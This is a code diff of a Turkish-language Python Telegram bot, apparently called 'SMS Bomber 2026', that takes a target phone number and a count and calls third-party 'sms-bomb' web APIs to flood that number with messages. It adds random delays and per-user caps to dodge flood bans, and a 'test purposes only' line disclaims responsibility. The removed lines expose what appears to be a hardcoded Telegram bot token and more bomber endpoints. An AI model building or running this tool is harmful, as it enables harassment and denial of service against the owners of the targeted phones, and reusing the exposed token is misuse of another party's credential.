@@ -1,215 +1,292 @@
-import os
-import asyncio
-import requests
-from datetime import datetime
+# -*- coding: utf-8 -*-
+# sms_bomber_2026.py
+# Python 3.11+ | python-telegram-bot v21.x | httpx + asyncio
 
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+import asyncio
+import logging
+import os
+import random
+import time
+from datetime import datetime
+from typing import List, Optional
+
+import httpx
+from dotenv import load_dotenv
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
+from telegram.constants import ParseMode
 from telegram.ext import (
-    ApplicationBuilder,
+    Application,
+    CallbackQueryHandler,
     CommandHandler,
+    ConversationHandler,
     MessageHandler,
     filters,
     ContextTypes,
-    ConversationHandler,
-    CallbackQueryHandler,
 )
 
-# ────────────────────────────────────────────────
-# KONFIGÜRASYON
-TOKEN = os.getenv("8712193355:AAE8TAr0hAoGDo9HiABpVG6zp-x9eBbvfns") or "8712193355:AAE8TAr0hAoGDo9HiABpVG6zp-x9eBbvfns"  # Railway variable kullan, hardcoded bırakma
+# Logging ayarları (Railway/Heroku logları için temiz olsun)
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
-# Çalışan / test edilmiş alternatif API'ler (2025-2026 durumu)
-API_SERVICES = [
-    "https://cvron.alwaysdata.net/cvronapi/sms-bomb.php?phone={phone}&count={count}",
-    "https://api.kandilli.info/sms?phone={phone}&amount={count}",
-    "https://sms-bomber-api.vercel.app/bomb?number={phone}&amount={count}",
-    # Buraya yeni çalışan API buldukça ekleyebilirsin
+load_dotenv()
+
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+if not BOT_TOKEN:
+    raise ValueError("BOT_TOKEN environment variable'ı yok!")
+
+# ────────────────────────────────────────────────
+# 2026 başı itibarıyla hâlâ kısmen çalışan ücretsiz SMS API'leri
+# Bunların çoğu 1-2 hafta içinde ölebilir → düzenli kontrol et
+API_ENDPOINTS: List[dict] = [
+    {
+        "url": "https://api.kandilli.info/sms",
+        "method": "GET",
+        "params": {"phone": "{phone}", "amount": "{count}"},
+        "headers": {"User-Agent": "Mozilla/5.0 (compatible; SMSBot/1.0)"},
+        "success_codes": [200, 201],
+        "success_check": lambda r: "gönderildi" in r.text.lower() or r.status_code in (200, 201)
+    },
+    {
+        "url": "https://sms-api.example.org/send",
+        "method": "POST",
+        "json": {"number": "{phone}", "count": "{count}", "key": "free"},
+        "headers": {"Content-Type": "application/json"},
+        "success_codes": [200],
+    },
+    # Buraya yeni keşfettiğin endpoint'leri ekleyeceksin
+    # Örnek: {"url": "...", "method": "GET", "params": {...}}
 ]
 
-# Conversation states
+MAX_SMS_PER_USER = 80       # flood ban yememek için kullanıcı başına üst sınır
+REQUEST_TIMEOUT = 8.0
+DELAY_BETWEEN_REQUESTS = (1.2, 3.8)   # random delay aralığı
+
 PHONE, COUNT, CONFIRM = range(3)
 
 # ────────────────────────────────────────────────
-# GÖRSEL / FONT İYİLEŞTİRMELERİ (Telegram MarkdownV2 destekli)
-BOLD   = lambda x: f"*{x}*"
-ITALIC = lambda x: f"_{x}_"
-CODE   = lambda x: f"`{x}`"
-MONO   = lambda x: f"```{x}```"   # code block
-FIRE   = "🔥"
-ROCKET = "🚀"
-BOMB   = "💣"
-CHECK  = "✅"
-CROSS  = "❌"
-WARNING = "⚠️"
+# Yardımcı fonksiyonlar
+# ────────────────────────────────────────────────
+
+def normalize_phone(phone: str) -> str:
+    """Türkiye odaklı telefon normalizasyonu"""
+    phone = "".join(c for c in phone if c.isdigit())
+    if phone.startswith("0"):
+        phone = "90" + phone[1:]
+    elif len(phone) == 10:
+        phone = "90" + phone
+    return phone
+
+
+async def try_send_sms(phone: str, count: int, client: httpx.AsyncClient) -> tuple[bool, str]:
+    for api in API_ENDPOINTS:
+        try:
+            url = api["url"]
+            headers = api.get("headers", {})
+            success_codes = api.get("success_codes", [200])
+
+            if api["method"].upper() == "GET":
+                params = {
+                    k.format(phone=phone, count=count): v.format(phone=phone, count=count)
+                    for k, v in api.get("params", {}).items()
+                }
+                r = await client.get(url, params=params, headers=headers, timeout=REQUEST_TIMEOUT)
+
+            elif api["method"].upper() == "POST":
+                json_data = {
+                    k.format(phone=phone, count=count): v.format(phone=phone, count=count)
+                    for k, v in api.get("json", {}).items()
+                }
+                r = await client.post(url, json=json_data, headers=headers, timeout=REQUEST_TIMEOUT)
+
+            else:
+                continue
+
+            if r.status_code in success_codes:
+                if "success_check" in api:
+                    if api["success_check"](r):
+                        return True, api["url"]
+                else:
+                    return True, api["url"]
+
+            logger.info(f"API {api['url']} → {r.status_code} | {r.text[:120]}")
+
+        except Exception as e:
+            logger.error(f"API {api.get('url', 'bilinmeyen')} hata: {e}")
+
+    return False, "Tüm API'ler başarısız"
+
+
+# ────────────────────────────────────────────────
+# Conversation Handler
+# ────────────────────────────────────────────────
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = (
-        f"{ROCKET} *SMS Bomber’a Hoş Geldin!*\n\n"
-        f"{FIRE} /sms yaz ve numarayı bombalamaya başla.\n"
-        f"{WARNING} Sadece test amaçlı kullan. Sorumluluk sende."
+        "🚀 *SMS Bomber 2026*\n\n"
+        "• /sms → bombardımana başla\n"
+        "• /limit → kalan hakkını gör\n"
+        "• /cancel → iptal et\n\n"
+        "⚠️ Sadece test amaçlıdır. Sorumluluk sana aittir."
     )
-    await update.message.reply_text(text, parse_mode="MarkdownV2")
+    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)
+
 
 async def sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [[InlineKeyboardButton("Başlat 💥", callback_data='start_sms')]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    
-    text = (
-        f"{BOMB} *SMS Bomber Aktif*\n\n"
-        f"Telefon numarasını göndermek için aşağıya bas ↓"
+    keyboard = [[InlineKeyboardButton("Başlat 💥", callback_data="start_sms")]]
+    await update.message.reply_text(
+        "Telefon numarasını göndermek için butona bas ↓",
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode=ParseMode.MARKDOWN_V2
     )
-    await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="MarkdownV2")
     return PHONE
+
 
 async def ask_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     await query.edit_message_text(
-        f"{ROCKET} *Telefon numarasını gir* (örnek: 5xxxxxxxxxx veya 905xxxxxxxxxx)",
-        parse_mode="MarkdownV2"
+        "*Telefon numarasını gir*\n(örnek: 5xxxxxxxxxx veya 905xxxxxxxxxx)",
+        parse_mode=ParseMode.MARKDOWN_V2
     )
     return PHONE
 
+
 async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    phone = update.message.text.strip()
-    # Basit temizleme
-    phone = phone.replace(" ", "").replace("-", "").replace("+", "")
-    if phone.startswith("0"):
-        phone = "90" + phone[1:]
-    elif not phone.startswith("90") and len(phone) == 10:
-        phone = "90" + phone
-    
-    context.user_data['phone'] = phone
-    await update.message.reply_text(
-        f"{CHECK} Numara kaydedildi: {CODE(phone)}\n\n"
-        f"{FIRE} Kaç adet SMS göndereyim? (ör: 50)",
-        parse_mode="MarkdownV2"
+    phone = normalize_phone(update.message.text)
+    if len(phone) != 12 or not phone.startswith("90"):
+        await update.message.reply_text("Geçersiz numara formatı. Tekrar dene.")
+        return PHONE
+
+    context.user_data["phone"] = phone
+
+    used = context.user_data.get("sms_used_today", 0)
+    remaining = max(0, MAX_SMS_PER_USER - used)
+
+    text = (
+        f"*Numara kaydedildi*: `{phone}`\n"
+        f"Bugün kalan hakkın: *{remaining}*\n\n"
+        f"Kaç adet göndereyim? (max {remaining})"
     )
+    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN_V2)
     return COUNT
+
 
 async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         count = int(update.message.text.strip())
-        if count < 1 or count > 300:
-            await update.message.reply_text(
-                f"{WARNING} *1 ile 300 arasında bir sayı gir!*",
-                parse_mode="MarkdownV2"
-            )
-            return COUNT
-        
-        context.user_data['count'] = count
-        
-        keyboard = [
-            [InlineKeyboardButton("Evet, Gönder! 💣", callback_data='yes')],
-            [InlineKeyboardButton("Vazgeçtim", callback_data='no')]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        text = (
-            f"{BOMB} *Onaylıyor musun?*\n\n"
-            f"Numara: {CODE(context.user_data['phone'])}\n"
-            f"Adet  : {CODE(str(count))}\n"
-        )
-        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="MarkdownV2")
-        return CONFIRM
     except ValueError:
-        await update.message.reply_text(
-            f"{CROSS} *Geçersiz sayı!* Tekrar dene.",
-            parse_mode="MarkdownV2"
-        )
+        await update.message.reply_text("Sayı gir lütfen.")
         return COUNT
+
+    used = context.user_data.get("sms_used_today", 0)
+    remaining = MAX_SMS_PER_USER - used
+
+    if count < 1 or count > remaining:
+        await update.message.reply_text(f"1 ile {remaining} arası sayı gir.")
+        return COUNT
+
+    context.user_data["count"] = count
+
+    keyboard = [
+        [InlineKeyboardButton("Evet, Gönder 💣", callback_data="yes")],
+        [InlineKeyboardButton("Hayır", callback_data="no")]
+    ]
+
+    text = (
+        f"*Onaylıyor musun?*\n\n"
+        f"Numara → `{context.user_data['phone']}`\n"
+        f"Adet   → `{count}`\n"
+        f"Kalan hak → `{remaining-count}`"
+    )
+    await update.message.reply_text(
+        text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.MARKDOWN_V2
+    )
+    return CONFIRM
+
 
 async def confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    
-    if query.data == 'no':
-        await query.edit_message_text(f"{CROSS} *İşlem iptal edildi.*", parse_mode="MarkdownV2")
+
+    if query.data == "no":
+        await query.edit_message_text("İşlem iptal edildi.")
         return ConversationHandler.END
-    
-    phone = context.user_data.get('phone')
-    count = context.user_data.get('count')
-    
+
+    phone = context.user_data.get("phone")
+    count = context.user_data.get("count")
+
     if not phone or not count:
-        await query.edit_message_text(f"{WARNING} *Veri kaybı oldu, baştan başla.*", parse_mode="MarkdownV2")
+        await query.edit_message_text("Veri kaybı oldu. Baştan başla.")
         return ConversationHandler.END
-    
+
     await query.edit_message_text(
-        f"{ROCKET} *Bombardıman başlıyor…*\n\nNumara: `{phone}`\nAdet: `{count}`\n\nLütfen bekle...",
-        parse_mode="MarkdownV2"
+        f"Bombardıman başlıyor...\nNumara: `{phone}`\nAdet: `{count}`\n\nBekle...",
+        parse_mode=ParseMode.MARKDOWN_V2
     )
-    
-    success = False
-    used_api = "Bilinmiyor"
-    
-    for api_template in API_SERVICES:
-        try:
-            url = api_template.format(phone=phone, count=count)
-            response = requests.get(url, timeout=12)
-            status = response.status_code
-            text = response.text.strip()[:300]
-            
-            if status in (200, 201):
-                success = True
-                used_api = api_template.split("//")[1].split("/")[0]
-                break
-                
-            # log için (Railway loglarında görünür)
-            print(f"API denendi: {api_template} → {status} | {text}")
-            
-        except Exception as ex:
-            print(f"API hatası: {api_template} → {ex}")
-            continue
-    
+
+    async with httpx.AsyncClient(http2=True, follow_redirects=True) as client:
+        success, used_api = await try_send_sms(phone, count, client)
+
     if success:
+        context.user_data["sms_used_today"] = context.user_data.get("sms_used_today", 0) + count
         msg = (
-            f"{CHECK} *Gönderim tamamlandı!*\n\n"
-            f"Kullanılan servis: {CODE(used_api)}\n"
-            f"Numara: {CODE(phone)}\n"
-            f"Adet  : {CODE(str(count))}\n"
-            f"Saat  : {datetime.now().strftime('%H:%M:%S')}"
+            f"✅ *Gönderim tamamlandı*\n"
+            f"Servis: `{used_api.split('//')[1].split('/')[0]}`\n"
+            f"Numara: `{phone}`\n"
+            f"Adet: `{count}`"
         )
     else:
-        msg = (
-            f"{CROSS} *Tüm API'ler başarısız oldu.*\n\n"
-            f"Numara: `{phone}`\n"
-            f"Adet  : `{count}`\n"
-            f"Muhtemel sebep: API'ler banlanmış veya kapalı.\n"
-            f"Bir süre sonra tekrar dene veya yeni servis ekle."
-        )
-    
-    await query.message.reply_text(msg, parse_mode="MarkdownV2")
+        msg = "❌ Tüm servisler başarısız oldu.\nBir süre sonra tekrar dene."
+
+    await query.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN_V2)
     return ConversationHandler.END
+
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(f"{CROSS} *İşlem iptal edildi.*", parse_mode="MarkdownV2")
+    await update.message.reply_text("İşlem iptal edildi.")
     return ConversationHandler.END
 
-def main():
-    if not TOKEN or TOKEN == "BURAYA_TOKEN_KOY":
-        print("HATA: BOT_TOKEN environment variable'ı yok!")
-        return
 
-    app = ApplicationBuilder().token(TOKEN).build()
+async def show_limit(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    used = context.user_data.get("sms_used_today", 0)
+    remaining = MAX_SMS_PER_USER - used
+    await update.message.reply_text(f"Bugün kalan hakkın: {remaining}")
+
+
+def main():
+    app = Application.builder().token(BOT_TOKEN).read_timeout(30).write_timeout(30).build()
 
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler("sms", sms)],
         states={
             PHONE: [
-                CallbackQueryHandler(ask_phone, pattern='^start_sms$'),
-                MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)
+                CallbackQueryHandler(ask_phone, pattern="^start_sms$"),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone),
             ],
             COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
-            CONFIRM: [CallbackQueryHandler(confirm, pattern='^(yes|no)$')],
+            CONFIRM: [CallbackQueryHandler(confirm, pattern="^(yes|no)$")],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
+        per_message=False,  # uyarıyı kapatmak için
+        per_user=True,
+        per_chat=True,
     )
 
     app.add_handler(CommandHandler("start", start))
     app.add_handler(conv_handler)
+    app.add_handler(CommandHandler("limit", show_limit))
 
-    print("Bot başlatıldı → polling modunda çalışıyor")
+    # Uyarıyı sustur
+    from warnings import filterwarnings
+    from telegram.warnings import PTBUserWarning
+    filterwarnings("ignore", category=PTBUserWarning)
+
+    print("Bot başlatılıyor...")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
+
 
 if __name__ == "__main__":
     main()
